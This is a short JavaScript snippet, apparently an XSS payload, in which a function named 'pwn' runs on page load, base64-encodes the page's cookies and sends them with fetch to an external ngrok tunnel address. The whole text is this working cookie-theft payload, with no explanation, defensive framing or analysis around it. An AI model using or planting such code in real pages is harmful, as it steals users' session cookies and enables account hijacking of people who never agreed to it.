async function pwn() {
    const res = await fetch('http://2.tcp.eu.ngrok.io:17864/q?='+btoa(document.cookie));
}

window.onload = function() {
    pwn();
}
